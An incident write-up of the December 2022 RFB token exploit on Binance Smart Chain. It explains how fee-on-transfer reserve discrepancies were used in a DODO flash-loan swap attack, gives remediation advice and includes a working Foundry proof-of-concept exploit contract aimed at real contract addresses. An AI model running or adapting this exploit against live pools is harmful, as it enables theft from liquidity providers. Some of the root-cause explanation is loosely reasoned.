# RFB — Fee-on-Transfer Swap Manipulation Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2022-12 |
| **Protocol** | RFB Token |
| **Chain** | Binance Smart Chain (BSC) |
| **Loss** | Unconfirmed |
| **RFB Token** | [0x26f1457f067bF26881F311833391b52cA871a4b5](https://bscscan.com/address/0x26f1457f067bF26881F311833391b52cA871a4b5) |
| **WBNB** | [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c](https://bscscan.com/address/0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c) |
| **RFB/WBNB Pair** | [0x03184AAA6Ad4F7BE876423D9967d1467220a544e](https://bscscan.com/address/0x03184AAA6Ad4F7BE876423D9967d1467220a544e) |
| **Uniswap V2 Router** | [0x10ED43C718714eb63d5aA57B78B54704E256024E](https://bscscan.com/address/0x10ED43C718714eb63d5aA57B78B54704E256024E) |
| **DODO Flash Loan** | [0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4](https://bscscan.com/address/0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4) |
| **Root Cause** | RFB fee-on-transfer fees are injected directly into the pair without calling `sync()` after the swap, causing a `balanceOf(pair) > reserve(pair)` discrepancy. In this desynchronized state, a reverse swap allows the attacker to receive more BNB than the reserve would otherwise permit |
| **CWE** | CWE-840: Business Logic Error |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-12/RFB_exp.sol) |

---
## 1. Vulnerability Overview

The RFB token incorporates a fee-on-transfer mechanism and was traded in an AMM pool paired with WBNB. When a fee-on-transfer token is traded in an AMM pool, the actual amount received is less than expected, causing a reserve discrepancy. The attacker flash-borrowed 20 WBNB from DODO and executed a BNB→RFB swap. Due to the fee-on-transfer, a discrepancy arose between the pair's actual RFB received amount and its recorded reserve. The attacker exploited this discrepancy during the RFB→BNB reverse swap to obtain a favorable exchange rate and realize a WBNB profit. After repaying the 20 WBNB flash loan, the attacker secured a net gain.

---
## 2. Vulnerable Code Analysis

```solidity
// RFB fee-on-transfer mechanism
// ❌ Reserve discrepancy occurs when trading fee-on-transfer tokens in an AMM

// Uniswap V2 pair — inadequate handling of fee-on-transfer tokens
// swap() execution causes a mismatch between actual received amount and expected amount
// ❌ Attack scenario:
// 1. BNB → RFB swap: AMM records X RFB as output
//    Attacker actually receives only X*(1-fee) RFB
//    → Pair reserve is under-recorded (actual balance > reserve)
// 2. RFB → BNB reverse swap: BNB output is calculated based on actual balance
//    → Reserve discrepancy allows receiving more BNB than expected

// ✅ Defensive pattern: pairs with fee-on-transfer tokens should
// call sync() after every swap, or use actual balances as reserves
contract SafeAMM {
    function swap(...) external {
        // ... execute swap ...
        // ✅ Immediately synchronize reserve after swap
        _update(
            IERC20(token0).balanceOf(address(this)),
            IERC20(token1).balanceOf(address(this)),
            reserve0,
            reserve1
        );
    }
}
```

---
### On-Chain Original Code

Source: Bytecode decompiled


**RFB_decompiled.sol** — Entry point:
```solidity
// ❌ Root cause: RFB fee-on-transfer fees are injected directly into the pair and `sync()` is not called after the swap, causing `balanceOf(pair) > reserve(pair)` discrepancy
    function balanceOf(address arg0) external view returns (uint256) {}  // 0x70a08231  // ❌ Vulnerability
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] Flash loan 20 WBNB from DODO
    │
    ├─[2] WBNB → BNB conversion (unwrap)
    │
    ├─[3] Test BNB → RFB swap (probe for optimal amount)
    │       Simulate various amounts, then determine optimal swap amount
    │
    ├─[4] Execute optimal BNB → RFB swap
    │       Due to fee-on-transfer:
    │       - Pair reserve decrease = expected value
    │       - Attacker received RFB = expected value * (1 - fee)
    │       → Pair's actual WBNB balance > reserve
    │
    ├─[5] RFB → BNB reverse swap
    │       ❌ Favorable exchange rate under reserve discrepancy state
    │       Excess BNB received
    │
    ├─[6] BNB → WBNB conversion (wrap)
    │
    ├─[7] Repay DODO flash loan (20 WBNB)
    │
    └─[8] Net profit: WBNB arbitrage gain
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface IWBNB {
    function withdraw(uint256) external;
    function deposit() external payable;
    function transfer(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

interface IRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256, uint256, address[] calldata, address, uint256
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256, address[] calldata, address, uint256
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256, uint256, address[] calldata, address, uint256
    ) external;
}

interface IDODO {
    function flashLoan(uint256, uint256, address, bytes calldata) external;
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

contract RFBExploit is Test {
    IERC20   RFB    = IERC20(0x26f1457f067bF26881F311833391b52cA871a4b5);
    IWBNB    WBNB   = IWBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IRouter  router = IRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IDODO    dodo   = IDODO(0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4);

    function setUp() public {
        vm.createSelectFork("bsc");
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Start] WBNB", WBNB.balanceOf(address(this)), 18);
        // [Step 1] DODO 20 WBNB flash loan
        dodo.flashLoan(20 * 1e18, 0, address(this), "");
        emit log_named_decimal_uint("[End] WBNB", WBNB.balanceOf(address(this)), 18);
    }

    function DPPFlashLoanCall(address, uint256 amount, uint256, bytes calldata) external {
        // [Step 2] WBNB → BNB
        WBNB.withdraw(amount);

        // [Steps 3~4] Execute optimal BNB → RFB swap
        // ⚡ Reserve discrepancy triggered by fee-on-transfer
        address[] memory path = new address[](2);
        path[0] = address(WBNB); path[1] = address(RFB);
        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: address(this).balance}(
            0, path, address(this), block.timestamp
        );

        // [Step 5] RFB → BNB reverse swap (exploiting reserve discrepancy)
        RFB.approve(address(router), type(uint256).max);
        path[0] = address(RFB); path[1] = address(WBNB);
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            RFB.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );

        // [Step 6] BNB → WBNB conversion
        WBNB.deposit{value: address(this).balance}();

        // Repay flash loan
        WBNB.transfer(address(dodo), amount);
    }

    receive() external payable {}
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Fee-on-transfer token AMM reserve discrepancy arbitrage |
| **CWE** | CWE-840: Business Logic Error |
| **OWASP DeFi** | AMM reserve manipulation |
| **Attack Vector** | DODO 20 WBNB flash loan → BNB→RFB (fee incurred) → RFB→BNB (exploiting reserve discrepancy) → flash loan repayment |
| **Preconditions** | RFB fee-on-transfer creates discrepancy between AMM reserve and actual balance; discrepancy persists without sync() |
| **Impact** | WBNB arbitrage gain (scale unconfirmed) |

---
## 6. Remediation Recommendations

1. **Separate fee recipient address**: Instead of injecting RFB transfer fees directly into the LP pair, send them to a separate address to prevent reserve discrepancies.
2. **Automatic sync() after swap**: Automatically call `pair.sync()` after every swap involving fee-on-transfer tokens to keep the reserve aligned with the actual balance.
3. **Minimum transfer amount**: Introduce a minimum transfer threshold to prevent dust fee accumulation from micro-transfers.

---
## 7. Lessons Learned

- **Structural incompatibility of fee-on-transfer + AMM**: Fee-on-transfer tokens are fundamentally incompatible with Uniswap V2-based AMMs. The AMM invariant (x\*y=k) assumes fee-free transfers, so whenever a fee-on-transfer token is included in a pair, a reserve discrepancy will always occur.
- **Small-scale flash loan of 20 WBNB**: Even a relatively small flash loan is sufficient to exploit fee-on-transfer vulnerabilities. The same pattern applied to pools with greater liquidity would yield proportionally larger gains.
- **Recurring pattern among BSC fee-on-transfer tokens**: PLTD, SEAMAN, AES, DFS, and RFB all share the identical fee-on-transfer + AMM reserve discrepancy pattern. The prevalent practice of designing auto-liquidity tokens on BSC requires fundamental re-examination.